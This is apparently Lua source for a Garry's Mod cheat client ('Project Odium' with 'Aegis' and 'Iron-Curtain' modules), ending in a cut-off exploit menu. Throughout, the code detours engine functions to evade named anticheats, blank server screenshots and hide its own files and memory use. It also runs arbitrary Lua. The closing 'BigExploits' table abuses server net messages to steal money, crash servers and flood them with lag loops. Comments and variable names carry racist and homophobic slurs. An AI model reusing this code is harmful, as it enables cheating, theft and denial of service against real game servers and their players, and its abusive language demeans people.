		local sneakyhooks = _A.h_GetTable()[name]

		if ( sneakyhooks != nil ) then

			for hk, func in next, sneakyhooks do

				local bSuccess, value = pcall(func, ...)

				if bSuccess then

					if (value != nil) then return value end

				end

			end

		end

	end





	local HookTable = legithooks[ name ]

	if ( HookTable != nil ) then

	

		local a, b, c, d, e, f



		for k, v in pairs( HookTable ) do 

			

			if ( isstring( k ) ) then

				

				--

				-- If it's a string, it's cool

				--

				a, b, c, d, e, f = v( ... )



			else



				--

				-- If the key isn't a string - we assume it to be an entity

				-- Or panel, or something else that IsValid works on.

				--

				if ( IsValid( k ) ) then

					--

					-- If the object is valid - pass it as the first argument (self)

					--

					a, b, c, d, e, f = v( k, ... )

				else

					--

					-- If the object has become invalid - remove it

					--

					HookTable[ k ] = nil

				end

			end



			--

			-- Hook returned a value - it overrides the gamemode function

			--

			if ( a != nil ) then

				return a, b, c, d, e, f

			end

				

		end

	end

	

	--

	-- Call the gamemode function

	--

	if ( !gm ) then return end

	

	local GamemodeFunction = gm[ name ]

	if ( GamemodeFunction == nil ) then return end

			

	return GamemodeFunction( gm, ... )

end, "hook.Call")



if !ULib then print("////////////////// Project Odium Detours: Stage 2 Initialized //////////////////") end



end



local cstr = CompileString

local isfaggot = isfunction

--local vgui = vgui

--local surface = surface

--local draw = draw

local blockjpg = true

local runlau = ""



local function InjectAegisCommands()

	local cblockedcmds = {

		["connect"] = true,

		["disconnect"] = true,

		["impulse"] = true,

		["pp_texturize"] = true,

		["pp_texturize_scale"] = true,

		["demos"] = true,

		["kill"] = false,

		["say"] = false,

		["__screenshot_internal"] = false,

	--    ["+voice"] = false,

	}



	_A.cc_Add( "aegis_blockedcmds", function()



	local bcpanel = vgui.Create("DFrame")

	if !bcpanel then return end

	bcpanel:SetSize(500,455)

	bcpanel:SetTitle("Manage Blocked ConCommands")

	bcpanel:Center()

	bcpanel:MakePopup()



	bcpanel.Paint = function( s, w, h )

	surface.SetDrawColor( Color(30, 30, 30, 255) )

	surface.DrawRect( 0, 0, w, h )

	surface.SetDrawColor( Color(55, 55, 55, 255) )

	surface.DrawOutlinedRect( 0, 0, w, h )

	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

	surface.SetDrawColor( Color(0, 0, 0, 200) )

	surface.DrawRect( 10, 25, w - 20, h - 35 )

	end



	local Plist = vgui.Create( "DPanelList", bcpanel )

	Plist:SetSize( bcpanel:GetWide() - 20, bcpanel:GetTall() - 35 )

	Plist:SetPadding( 5 )

	Plist:SetSpacing( 5 )

	Plist:EnableHorizontal( false )

	Plist:EnableVerticalScrollbar( true )

	Plist:SetPos( 10, 25 )

	Plist:SetName( "" )



	local function CreateCMDBlockPanel( cmd )

	if !bcpanel then return end

		local cmdp = vgui.Create( "DPanel" )

		cmdp:SetSize( Plist:GetWide(), 30 )

		cmdp.Cmd = cmd

		cmdp.Paint = function( s, w, h )

			surface.SetDrawColor( Color(50, 50, 50, 255) )

			surface.DrawRect( 0, 0, w, h )

			surface.SetDrawColor( Color(65, 65, 65, 255) )

			surface.DrawOutlinedRect( 0, 0, w, h )

			draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 8, Color(255,255,255) )

		end



		local TButton = vgui.Create( "DButton", cmdp )

		TButton:SetPos( 390, 2 )

		TButton:SetText( "" )

		TButton:SetTextColor( Color(255, 255, 255, 255) )

		TButton:SetSize( 60, 26 )



		TButton.Paint = function( self, w, h )

			local dtx = "Block"

			local dtc = Color(150, 30, 30, 255)

			if !cblockedcmds[cmdp.Cmd] then dtx = "Allow" dtc = Color(20, 20, 20, 255) end

			surface.SetDrawColor( dtc )

			surface.DrawRect( 0, 0, w, h )

			surface.SetDrawColor( Color(45, 45, 45, 255) )

			surface.DrawOutlinedRect( 0, 0, w, h )

			draw.DrawText( dtx, "DermaDefault", 30, 6, Color(255,255,255), 1 )

		end



		TButton.DoClick = function() 

			cblockedcmds[cmdp.Cmd] = !cblockedcmds[cmdp.Cmd]

			for cmd, val in pairs( cblockedcmds ) do

				_A.security.BlockRemoteExecCmd( cmd, val )

			end

		end



		Plist:AddItem( cmdp )

	end





	for k, v in pairs( cblockedcmds ) do

		CreateCMDBlockPanel( k )

	end



	end)







	_A.cc_Add( "aegis_camera_spam", function( p, c, a, str ) 

	blockjpg = !blockjpg

	print( "AEGIS BLOCK CAMERA SCREENSHOT MODE = "..tostring(blockjpg) )

	end )



	--------------------------------------------- ANTICHEAT SCANNER ---------------------------------------------



	local function ispooped( str )

		local status, error = pcall( net.Start, str )

		return status

	end



	local acfags = {

		["!Cake Anticheat (CAC)"] = {

			desc = "The most common anticheat in use today (and your worst nightmare before you bought Odium)\nHas very strong detections that still stomp skids out of existence 2 years after it was released",

			scan = function() return _A.aegis.anticheats["extensions/client/vehicle.lua"] end,

		},

		["Simplicity Anticheat (SAC)"] = {

			desc = "Leystryku's new anticheat he released on scriptfodder\nNot as strong as CAC but (apparently) offers better serverside performance",

			scan = function() if _G.simplicity then return true else return false end end,

		},

		["Quack Anticheat (QAC)"] = {

			desc = "A dated open source anticheat from 2014\nRPtards still edit and use this piece of shit and call it their 1337 private anticheat",

			scan = function() return ( _G.QAC and ispooped( "quack" ) ) end,

		},

		["Supservers Anticheat"] = {

			desc = "More of a blacklist of public scripts than a true anticheat\nThis rubbish poses no threat to us (be careful of them screengrabbing you though)",

			scan = function() return ispooped( "rp.OrgMotd" ) end,

		},

		["Screengrab V2"] = {

			desc = "A public utility that can be used to take a screenshot of your client\nOur screenshot cleaner works against this",

			scan = function() if _G.OpenSGMenu then return true else return false end end,

		},

		["Pablo's Screengrab"] = {

			desc = "A public utility that can be used to take a screenshot of your client\nOur screenshot cleaner works against this",

			scan = function() if _G.SCRG then return true else return false end end,

		},

		["Enforcer Anti Minge"] = {

			desc = "A general purpose anti minge script that includes anti propkill, anti crash and logging",

			scan = function() if _G.EnforcerAddMessage then return true else return false end end,

		},

		["AP Anti"] = {

			desc = "A stupidly named open source anti-propkill script\nYou probably won't be able to propkill on this server",

			scan = function() return ispooped( "APAnti AlertNotice" ) end,

		},



	}





	_A.cc_Add( "aegis_view_anticheats", function()

		local acpanel = vgui.Create("DFrame")

		if !acpanel then return end

		acpanel:SetSize(500,455)

		acpanel:SetTitle("Server Security Measures")

		acpanel:Center()

		acpanel:MakePopup()



		acpanel.Paint = function( s, w, h )

		surface.SetDrawColor( Color(30, 30, 30, 255) )

		surface.DrawRect( 0, 0, w, h )

		surface.SetDrawColor( Color(55, 55, 55, 255) )

		surface.DrawOutlinedRect( 0, 0, w, h )

		surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

		surface.SetDrawColor( Color(0, 0, 0, 200) )

		surface.DrawRect( 10, 25, w - 20, h - 35 )

		end



		local Plist = vgui.Create( "DPanelList", acpanel )

		Plist:SetSize( acpanel:GetWide() - 20, acpanel:GetTall() - 35 )

		Plist:SetPadding( 5 )

		Plist:SetSpacing( 5 )

		Plist:EnableHorizontal( false )

		Plist:EnableVerticalScrollbar( true )

		Plist:SetPos( 10, 25 )

		Plist:SetName( "" )





		local function CreateACPanel( cmd )

		if !acpanel then return end

			local cmdp = vgui.Create( "DPanel" )

			cmdp:SetSize( Plist:GetWide(), 60 )

			cmdp.Cmd = cmd

			cmdp.Desc = acfags[cmd].desc

			cmdp.Paint = function( s, w, h )

				surface.SetDrawColor( Color(50, 50, 50, 255) )

				surface.DrawRect( 0, 0, w, h )

				surface.SetDrawColor( Color(65, 65, 65, 255) )

				surface.DrawOutlinedRect( 0, 0, w, h )

				surface.DrawLine( 0, 24, w, 24 )

				draw.DrawText( cmdp.Cmd, "DermaDefault", 10, 5, Color(255,255,255) )

				draw.DrawText( cmdp.Desc, "DermaDefault", 10, 28, Color(205,205,255, 100) )

			end



			Plist:AddItem( cmdp )

		end





		for k, v in pairs( acfags ) do

			if v["scan"]() then CreateACPanel( k ) end

		end

	end)







	_A.cc_Add( "aegis_disable_renderpanic", function() videomeme = false runbitchrun = false end)





--------------------------------------------- LUA_RUN ---------------------------------------------





_A.cc_Add( "odium_lua_run_cl", function()

    if LuaMenu and LuaMenu:IsVisible() then return end



    LuaMenu = vgui.Create("DFrame")

    LuaMenu:SetSize(500,550)

    LuaMenu:SetTitle("Run Lua")

    LuaMenu:Center()

    LuaMenu:MakePopup()



    LuaMenu.Paint = function( s, w, h )

        surface.SetDrawColor( Color(30, 30, 30, 255) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color(55, 55, 55, 245) )

        surface.DrawOutlinedRect( 0, 0, w, h )

        surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )

    end



    local luatxt = vgui.Create( "DTextEntry", LuaMenu )

    luatxt:SetPos( 5, 25 )

    luatxt:SetSize( LuaMenu:GetWide() - 10, LuaMenu:GetTall() - 65 )

    luatxt:SetText( "" )

    luatxt:SetMultiline( true ) 

    luatxt.OnChange = function( self )

    end



    local runlua = vgui.Create( "DButton", LuaMenu )

    runlua:SetPos( 5, LuaMenu:GetTall() - 35 )

    runlua:SetText( "Run Lua" )

    runlua:SetTextColor( Color(255, 255, 255, 255) )

    runlua:SetSize( LuaMenu:GetWide() - 10, 30 )



    runlua.Paint = function( self, w, h )

        surface.SetDrawColor( Color(60, 60, 60, 200) )

        surface.DrawRect( 0, 0, w, h )

        surface.SetDrawColor( Color( 60, 60, 60 ) )

        surface.SetMaterial( downgrad )

        surface.DrawTexturedRect( 0, 0, w, h/ 2 )

        surface.SetDrawColor( Color(100, 100, 100, 255) )

        surface.DrawOutlinedRect( 0, 0, w, h )

    end





    runlua.DoClick = function()

		runlau = luatxt:GetValue()

		local run = cstr( runlau, "", false )

		if isfaggot( run ) then _A.engine.RunString( runlau ) else

			print( "YOUR CODE FUCKING SUCKS RETARD" )

			print( run )

		end

    end



end)



end









------------------------------------------------------------------------------

--							  		NOTIFY			  						--

------------------------------------------------------------------------------



local messagetypes = false

timer.Simple( 5, function() -- have to load this after autorun otherwise Color() doesn't exist

	messagetypes = {

    	[1] = { ["col"] = Color( 200, 200, 200 ), ["icon"] = Material( "icon16/application_xp_terminal.png" ) }, -- neutral message

    	[2] = { ["col"] = Color( 250, 200, 140 ), ["icon"] = Material( "icon16/cross.png" ) }, -- negative message

    	[3] = { ["col"] = Color( 180, 250, 180 ), ["icon"] = Material( "icon16/tick.png" ) }, -- positive message

    	[4] = { ["col"] = Color( 250, 140, 140 ), ["icon"] = Material( "icon16/error.png" ) }, -- error message

    	[5] = { ["col"] = Color( 180, 180, 250 ), ["icon"] = Material( "icon16/user.png" ) }, -- blue message

    	[6] = { ["col"] = Color( 250, 250, 180 ), ["icon"] = Material( "icon16/lightbulb.png" ) }, -- lightbulb message

	}

end )



local aegiscomponent = { color = -1, name = "Aegis" }



local notifies = {}

local tableinsert = table.insert

local istable = istable

local error = error



function _A.aegis.Notify( component, type, text )

	if !messagetypes then return end

	if !component or !istable( component ) then component = { color = Color( 255, 0, 0 ), name = "DEFINE A SCRIPT COMPONENT PROPERLY YOU AUTIST" } end

	if !messagetypes[type] then 

		tableinsert( notifies, { ["time"] = CurTime() + 10, ["ccol"] = Color(255,0,0), ["ctxt"] = "[ AEGIS ERROR ]", ["icon"] = "icon16/error.png", ["col"] = Color(255,0,0), ["txt"] = "Invalid aegis notify type! must be 1-6!" } ) 

		return 

	end

	if component.color == -1 then component.color = Color( 55, 55, 155 ) end

    tableinsert( notifies, { ["time"] = CurTime() + 10, ["ccol"] = component.color, ["ctxt"] = "[ "..component.name.." ]", ["icon"] = messagetypes[type].icon, ["col"] = messagetypes[type].col, ["txt"] = text } )

end





-- odium.aegis.Notify( { color = -1, name = "Aegis" }, 1, "NIGGERS" )



local function DrawNotifies()

--	if !messagetypes then return end

    local x, y = 10, ScrH() / 2

    local cutoff = 0

    for k, v in pairs( notifies ) do

    	if cutoff > 30 then continue end

    	cutoff = cutoff + 1

        local lx = 10

        local timeleft = v.time - CurTime()

        if timeleft < 2 then lx = 10 - ( ( 2 - timeleft )  * 800 ) end -- pull back into the edge of the screen at the end of the timer

        if timeleft <= 0.5 then notifies[k] = nil continue end -- your time is up faggot

        local bgcol = Color( v.ccol.r, v.ccol.g, v.ccol.b, 145 )

        local bgcol2 = Color( v.col.r, v.col.g, v.col.b, 145 )

        surface.SetDrawColor( v.ccol )

        local txw, txh = draw.SimpleText( v.ctxt, "Trebuchet18", lx, y, v.ccol, 0, 0 )    



        surface.SetDrawColor( bgcol )

        surface.DrawRect( lx - 5, y - 1, txw + 10, 20 )

        surface.DrawLine( lx - 5, y - 1, lx - 5 + (txw + 10), y - 1 )



        surface.SetDrawColor( Color(255,255,255, 150) )

        surface.SetMaterial( v.icon )

        surface.DrawTexturedRect( (lx - 5) + txw + 16, y + 1, 16, 16 )



        txw = txw + 22



        surface.SetDrawColor( bgcol2 )

        local txw2, txh2 = draw.SimpleText( v.txt, "Trebuchet18", (lx - 5) + txw + 20, y, v.col, 0, 0 )

        surface.DrawRect( (lx - 5) + txw + 15, y - 1, txw2 + 10, 20 )

        surface.DrawLine( (lx - 5) + txw + 15, y - 1, ((lx - 5) + txw + 15) + txw2 + 10, y - 1 )



        y = y - 25

    end

end



timer.Simple( 6, function() 

	_A.h_Add( "HUDPaint", "AegisNotifications", DrawNotifies ) 

--	_A.aegis.Notify( aegiscomponent, 1, "BLACK PEOPLE" ) 

end )





local function InjectCCSystem()

	--[[

	ANUBIS CHANGE

	This function was having a bit of a cry when the second argument to concommand.Add, func, 

	was null. I just added a little check that makes sure func is A ok to be used.

	]]

	local _concommandAdd = concommand.Add

	concommand.Add = aegis.Detour( concommand.Add, function( ... )

		local args = {...}

		local func = args[2]

		

		if func and jufi(func).source == "@" then 

			return _A.cc_Add( ... ) 

		end

		

		return _concommandAdd( ... )

	end)



	local _concommandRun = concommand.Run

	concommand.Run = aegis.Detour( concommand.Run, function( player, command, arguments, args )

	_concommandRun( player, command, arguments, args )



		local LowerCommand = string.lower( command )



		if ( CommandList2[ LowerCommand ] != nil ) then

			CommandList2[ LowerCommand ]( player, command, arguments, args )

			return true

		end



		return false

	end, "concommand.Run")



	InjectAegisCommands()



	print("////////////////// Project Odium Detours: Stage 3 Initialized //////////////////")

end





local blockincludes = {

	// gpseak crashes us so lets block it from loading

	["lib/preferences.lua/preferences.lua"] = true,

	["lib/i18n.lua/i18n.lua"] = true,

	["conf/theme.lua"] = true,

	["speak/cl_main.lua"] = true,

	["conf/emoticons.lua"] = true,

}



local ac = {

	["extensions/client/vehicle.lua"] = "!cake anticheat",

	["autorun/simplicityac.lua"] = "simplicity anticheat",

}



local old_include = include

include = aegis.Detour( include, function( str )

if ac[str] then

	_A.aegis.anticheats[str] = ac[str]

	aegis.log( "Anticheat detected: "..ac[str]  )

end

if blockincludes[str] then

	aegis.log( "Blocked loading of naughty file: "..str  )

	return

end

if str == "ulib/shared/sh_ucl.lua" then InjectHookSystem() end -- inject it again cos ulx just raped us

return old_include(str)

end)







local saferequires = {

	["baseclass"] = true,

	["concommand"] = true,

	["saverestore"] = true,

	["hook"] = true,

	["gamemode"] = true,

	["weapons"] = true,

	["scripted_ents"] = true,

	["player_manager"] = true,

	["numpad"] = true,

	["team"] = true,

	["undo"] = true,

	["cleanup"] = true,

	["duplicator"] = true,

	["constraint"] = true,

	["construct"] = true,

	["usermessage"] = true,

	["list"] = true,

	["cvars"] = true,

	["http"] = true,

	["properties"] = true,

	["widget"] = true,

	["cookie"] = true,

	["utf8"] = true,

	["drive"] = true,

	["draw"] = true,

	["markup"] = true,

	["effects"] = true,

	["halo"] = true,

	["killicon"] = true,

	["spawnmenu"] = true,

	["controlpanel"] = true,

	["presets"] = true,

	["menubar"] = true,

	["matproxy"] = true,

}



local tocopy = ""

local hooksinjected = false

local old_req = require

_A.require = old_req

require = aegis.Detour( require, function( str )

if tocopy != "" and _G[tocopy] then

	_A.G[tocopy] = tabble.Copy( _G[tocopy] )

	tocopy = ""

end



if saferequires[str] and saferequires[str] != -1 then

	tocopy = str

	saferequires[str] = -1

end



if str == "gamemode" and !hooksinjected then InjectHookSystem() InjectCCSystem() end

return old_req(str)

end)



local renderview = render.RenderView

local renderclear = render.Clear

local rendercap = render.Capture

--local eyepos = EyePos

--local eyeang = EyeAngles

local vgetworldpanel = vgui.GetWorldPanel







local function renderpanic( delay )

if runbitchrun then return end

runbitchrun = true

renderclear( 0, 0, 0, 255, true, true )



renderview( {

	origin = LocalPlayer():EyePos(),

	angles = LocalPlayer():EyeAngles(),

	x = 0,

	y = 0,

	w = ScrW(),

	h = ScrH(),

	dopostprocess = true,

	drawhud = true,

	drawmonitors = true,

	drawviewmodel = true

} )



local worldpanel = vgetworldpanel()

if IsValid( worldpanel ) then

	worldpanel:SetPaintedManually( true )

end



for k, v in pairs( ents.GetAll() ) do

	if v:GetColor() and v:GetColor().a == 100 and v:GetRenderMode() and v:GetRenderMode() == 4 then v:SetColor( Color( 255, 255, 255 ) ) end

end



timer.Simple( delay, function()

	vgetworldpanel():SetPaintedManually( false )

	runbitchrun = false

end)

end











local findmeta = FindMetaTable

local ply = findmeta( "Player" )

local oconcommand = ply.ConCommand

ply.ConCommand = aegis.Detour( ply.ConCommand, function( pl, cmd, ... )



if string.lower(cmd) == "jpeg" then

	if blockjpg then return end

	renderpanic( 0.2 )

	oconcommand( pl, cmd, ... )

	timer.Simple( 0.2, function()

		_A.aegis.Notify( aegiscomponent, 3, "Protected your client from jpeg screenshot request" ) 

	end )

	return

end



if string.lower(cmd) == "__screenshot_internal" then

	renderpanic( 0.3 )

	oconcommand( pl, cmd, ... )

	timer.Simple( 0.3, function()

		_A.aegis.Notify( aegiscomponent, 3, "Protected your client from __screenshot_internal request" ) 

	end )

	return

end



return oconcommand( pl, cmd, ... )

end)





render.Capture = aegis.Detour( render.Capture, function( data )

	renderpanic( 0.05 )

	local capture = rendercap( data )

	return capture

end )



local orcp = render.CapturePixels

render.CapturePixels = aegis.Detour( render.CapturePixels, function(...)

	renderpanic( 0.05 )

	orcp( ... )

	return

end )











--local chattxt = chat.AddText

local orcc = RunConsoleCommand

RunConsoleCommand = aegis.Detour( RunConsoleCommand, function( cmd, ... )



if string.lower(cmd) == "__screenshot_internal" then

	renderpanic( 0.3 )

	orcc( cmd, ... )

	timer.Simple( 0.3, function()

		_A.aegis.Notify( aegiscomponent, 3, "Protected your client from __screenshot_internal request" ) 

	end )

	return

end



if string.lower(cmd) == "jpeg" then

	renderpanic( 0.2 )

	orcc( cmd, ... )

	timer.Simple( 0.2, function()

		_A.aegis.Notify( aegiscomponent, 3, "Protected your client from jpeg screenshot request" )

	end )

	return

end



return orcc( cmd, ... )

end )



local gayinfonum = gcinfo()

local gayinfo = gcinfo

gcinfo = aegis.Detour( gcinfo, function( ... )

	local onum = gayinfo( ... )

	local newnum = onum - gayinfonum

	return newnum

end)



local nigger = string.find

local function protectpath( f )

	local inf = dbginfo( 4 )

	if !inf then return true end

	local src = inf.source

	return nigger( f, "acebot_settings.dat" ) and src != "@"

end



local fagopen = file.Open

file.Open = aegis.Detour( file.Open, function( f, m, p )

	if protectpath( f ) then return end

	return fagopen( f, m, p )

end )



local fagexists = file.Exists

file.Exists = aegis.Detour( file.Open, function( f, p )

	if protectpath( f ) then return false end

	return fagexists( f, p )

end )
local s, odium = pcall( collectgarbage, 'odium' ) if (not odium) or (not odium.aegis) then

	return

end



local playerTable = FindMetaTable("Player")

local cbacks = {}

local blockedCmds = {}



local _oRunConsoleCommand = RunConsoleCommand

local _oConCommand = playerTable.ConCommand



local _oInclude = include

local _oRequire = require



local _ipairs = ipairs

local _Getfenv = debug.getfenv

local oStr, oValue = nil



local unlock_time

local tbl_BadSrc = {}



local function LogString( str ) 

	chat.AddText(Color(134, 171, 167), "Iron-Curtain # ", Color(255, 255, 255), str)

end



local function StartsWith( source, with )

	local len = with:len()

	

	if(source:len() < len) then

		return false

	end

	

	for i=1, len do

		if(source[i] ~= with[i]) then

			return false

		end

	end

	

	return true

end



local function IsBadSource( info )

	if(not info) then

		return false

	end



	if((info.short_src:find("[C]")) or (info.short_src:find("LuaCmd"))) then

		return true

	end

	

	return false

end



local function Alert()

	local t = os.time()

	

	if(unlock_time == nil) then

		unlock_time = t + 3

	elseif(t > unlock_time) then

		unlock_time = t + 3

	else return end

	

	LogString("We've blocked a malicious attempt to read GMod's memory.")

end



ipairs = odium.aegis.Detour( ipairs, function ( tbl )

	local str, val = debug.getupvalue( ipairs, 1 )

	

	if(type(val) == "number") then

		Alert()

		debug.setupvalue(_ipairs, 1, oValue)

		

		local info = debug.getinfo( 1 )

		table.insert(tbl_BadSrc, info.short_src)

		return _ipairs({ })

	end

	

	return _ipairs( tbl )

end)



debug.getfenv = odium.aegis.Detour( debug.getfenv, function ( tbl )

	local info = debug.getinfo( 1 )

	if(table.HasValue(tbl_BadSrc, info.short_src)) then

		local key = table.KeyFromValue(tbl_BadSrc, info.short_src)

		

		if(key ~= nil) then

			table.remove(tbl_BadSrc, key)

			return nil

		end

	end

	

	return _Getfenv( tbl )

end)

oStr, oValue = debug.getupvalue(_ipairs, 1)



--[[

WaitForPostLoad

Summary:

]]



include = odium.aegis.Detour( include, function ( file )

	local inc = _oInclude( file )

	

	local ctr = 1

	for k,v in pairs(cbacks) do

		if(string.find(file, k)) then

			v()

			table.remove(cbacks, ctr)

		end

		

		ctr = ctr + 1

	end

	return inc

end)



require = odium.aegis.Detour( require, function ( file )

	local req = _oRequire( file )

	

	local ctr = 1

	for k,v in pairs(cbacks) do

		if(string.find(file, k)) then

			v()

			table.remove(cbacks, ctr)

		end

		

		ctr = ctr + 1

	end

	return req

end)



local function WaitForPostLoad( file, callback )

	if(cbacks[file] ~= nil) then

		return

	end

	cbacks[file] = callback

end



--



--[[

ConCommand blocking

Summary:

]]

local function IsCommandBlocked( cmd_raw )

	for k,v in pairs(blockedCmds) do

		if(StartsWith(cmd_raw, v) == true) then

			return true

		end

	end

	

	return false

end



RunConsoleCommand = odium.aegis.Detour( RunConsoleCommand, function ( cmd, ... )

	if(IsCommandBlocked(cmd) and IsBadSource()) then

		return

	end

	

	return _oRunConsoleCommand( cmd, ... )

end)



playerTable.ConCommand = odium.aegis.Detour( playerTable.ConCommand, function ( ply, cmd )

	if(IsCommandBlocked(cmd) and IsBadSource()) then

		return

	end

	return _oConCommand( ply, cmd )

end)



function ProtectCommand(cmd)

	if(blockedCmds[cmd]  ~= nil) then

		return

	end

	blockedCmds[#blockedCmds + 1] = cmd

end



function UnProtectCommand(cmd)

	for k,v in pairs(blockedCmds) do

		if(v == cmd) then

			odium.security.BlockRemoteExecCmd(cmd, false)

			table.remove(blockedCmds, k)

			break

		end

	end

end



WaitForPostLoad("hook", function ()

	hook.Add("InitPostEntity", "BlockCmds", function ()

		if(odium and odium.GetConCommandList) then

			local aegis_Cmds = odium.GetConCommandList()

			for k,v in pairs(aegis_Cmds) do

				ProtectCommand(k)

			end

		end

	

		for k,v in pairs(blockedCmds) do

			odium.security.BlockRemoteExecCmd(v, true)

		end

	end)

end)

--



print("# Iron-Curtain #")

print("# Garry's Mod Client Security")

print("# created by Anubis")



-- Some default commands to protect.

ProtectCommand("say")

ProtectCommand("impulse")

ProtectCommand("pp_texturize")

ProtectCommand("pp_texturize_scale")
end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Defqon" )
DermaButton:SetPos( 0, 120 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
    local AimbotPoints = {}
	AimbotPoints[1] = {bone = "ValveBiped.Bip01_Head1"}
	AimbotPoints[2] = {bone = "ValveBiped.Bip01_Neck1"}
	AimbotPoints[3] = {bone = "ValveBiped.Bip01_Spine4"}
	AimbotPoints[4] = {bone = "ValveBiped.Bip01_Spine2"}
	AimbotPoints[5] = {bone = "ValveBiped.Bip01_Spine"}
	surface.CreateFont( "Font L", {
		font = "Courier New",
		size = 18,
		weight = 300,
	} )
	surface.CreateFont( "Font M", {
		font = "Courier New",
		size = 15,
		weight = 300,
	} )
	surface.CreateFont( "Font L2", {
		font = "Verdana",
		extended = false,
		size = 12,
		weight = 1000,
		blursize = 0,
		scanlines = 0,
		shadow = true,
		antialias = true
	} )
	// if you're going to use this for your paste atleast give me credit :)
	// CFour - /id/BordersClosed/
	local pMenu = {} // functions
	local pMenuVars = {
		Tabs = {},
		Sliders = {},
		CheckBoxes = {},
		Exploits = {}
	} // store values to be used at a later time
	local BigExploits = {}
	local PI = 3.14159265359;
	local Rad = 180 / PI
	function pMenu.IsNetString(netstring)
		local validate,_ = pcall( net.Start, netstring )
		if validate then
			return validate;
		end
		return false;
	end
	function pMenu.RandomString(len)
		if len == nil then
			len = math.random(20,100)
		end
		local ret = ""
		for i=1,len do
			ret = ret..string.char(math.random(33,126)) // fist 32 of ascii is pretty much garbage, I don't want spaces so we're skipping 32.
		end                                             // also I don't think gmod uses extended ascii 
		return ret
	end
	BigExploits["Мани с дуэли)"] = {func = 
	function() 
		if pMenu.IsNetString("duelrequestguiYes") then
			net.Start("duelrequestguiYes")
			net.WriteInt(-2147483648,32) // b1g 32 bit int laff -> -99999999999999999999999999999999999999999999999999999999999999999999999999999
			net.WriteEntity(table.Random( player.GetAll() ) )
			net.WriteString("Crossbow")
			net.SendToServer()
		end
	end
	}
	BigExploits["Наркотики стилят оружия?"] = {func = 
	function() 
		if pMenu.IsNetString("drugseffect_remove") then
			net.Start("drugseffect_remove")
			net.SendToServer()
		end
	end
	}
	BigExploits["Наркотики крадут деньги?"] = {func = 
	function()
		if pMenu.IsNetString("drugs_money") then
			net.Start("drugs_money")
			net.SendToServer()
		end
	end
	}
	BigExploits["Наркотики поджигают все пропы?"] = {func = 
	function() 
		if pMenu.IsNetString("drugs_ignite") then
			net.Start("drugs_ignite")
			net.WriteString("prop_physics")
			net.SendToServer()
		end
	end
	}
	BigExploits["Наркота убирает все пропы?"] = {func = 
	function() 
		if pMenu.IsNetString("drugs_text") then
			net.Start("drugs_text")
			net.WriteString("prop_physics")
			net.SendToServer()
		end
	end
	}
	BigExploits["TGN Advanced Money Printer Взят кэш)"] = {func = 
	function()
		if pMenu.IsNetString("SyncPrinterButtons76561198056171650") then
			for _,v in pairs(ents.FindByClass("adv_moneyprinter")) do
				if v:IsValid() then
					net.Start( "SyncPrinterButtons76561198056171650" )
					net.WriteEntity(v)
					net.WriteUInt(2, 4)
					net.SendToServer()
				end
			end
		end
	end
	}
	
	BigExploits["Логгирующий скрипт кикает всех?"] = {func = 
	function()
		if pMenu.IsNetString("DL_Answering") then
			local function reportQuestionmark()
				for i = 1, 2000 do 
					net.Start("DL_Answering")
					net.SendToServer()
				end
			end
			timer.Create(pMenu.RandomString(20),0.1,50,reportQuestionmark)
		end
	end
	}
	BigExploits["SimplicityAC Краш сервера"] = {func = 
	function()
		if pMenu.IsNetString("SimplicityAC_aysent") then
			local tbl = {}
			for i=1,1000 do
				tbl[i] = i;
			end
			net.Start("SimplicityAC_aysent")
		 
			net.WriteUInt(1, 8)
		 
			net.WriteUInt(4294967295, 32)
		 
			net.WriteTable(tbl)
		 
			net.SendToServer()
		end
	end
	}
	BigExploits["Auzlex's Teleport System Lag"] = {func = 
	function()
		if pMenu.IsNetString("ATS_WARP_REMOVE_CLIENT") then
			timer.Create(pMenu.RandomString(20),0.05,6000,function()
				for k,v in pairs(player.GetAll()) do
					net.Start( "ATS_WARP_REMOVE_CLIENT" )
					net.WriteEntity( v )
					net.WriteString( "adminroom1" )
					net.SendToServer()
					net.Start( "ATS_WARP_FROM_CLIENT" )
					net.WriteEntity( v )
					net.WriteString( "adminroom1" )
					net.SendToServer()
					net.Start( "ATS_WARP_VIEWOWNER" )
					net.WriteEntity( v )
					net.WriteString( "adminroom1" )
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 2"] = {func = 
	function()
		if pMenu.IsNetString("CFRemoveGame") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()   
				for k,v in pairs(player.GetAll()) do
					net.Start( "CFRemoveGame" )
					net.WriteFloat( math.Round( "10000\n" ) )
					net.SendToServer()
					net.Start( "CFJoinGame" )
					net.WriteFloat( math.Round( "10000\n" ) )
					net.SendToServer()
					net.Start( "CFEndGame" )
					net.WriteFloat( "10000\n" )
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 3"] = {func = 
	function()
		if pMenu.IsNetString("CreateCase") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i = 1, 300 do
					net.Start( "CreateCase" )
					net.WriteString( "tapped by b1g hack from citizenhack.me" )
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 4"] = {func = 
	function()
		if pMenu.IsNetString("rprotect_terminal_settings") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i = 1, 200 do
					net.Start( "rprotect_terminal_settings" )
					net.WriteEntity( LocalPlayer() )
					net.SendToServer()
				end
			end)
		end
	end
	}
	BigExploits["Lagger 5"] = {func = 
	function()
		if pMenu.IsNetString("StackGhost") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i = 1, 8 do
					for k,v in pairs( player.GetAll() ) do
						net.Start( "StackGhost" )
						net.WriteInt(69,32)
						net.SendToServer()
					end
				end
			end)
		end
	end
	}
	BigExploits["Lagger 6"] = {func = 
	function()
		if pMenu.IsNetString("JoinOrg") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for k,v in pairs(player.GetAll()) do
					net.Start("JoinOrg")
						net.WriteEntity(LocalPlayer())
						net.WriteString("test")
					net.SendToServer()                         
				end
			end)
		end
	end
	}
	BigExploits["Lagger 7"] = {func = 
	function()
		if pMenu.IsNetString("pac_submit") then
			timer.Create(pMenu.RandomString(20),0.02,15000,function()
				for i=1, 1800 do
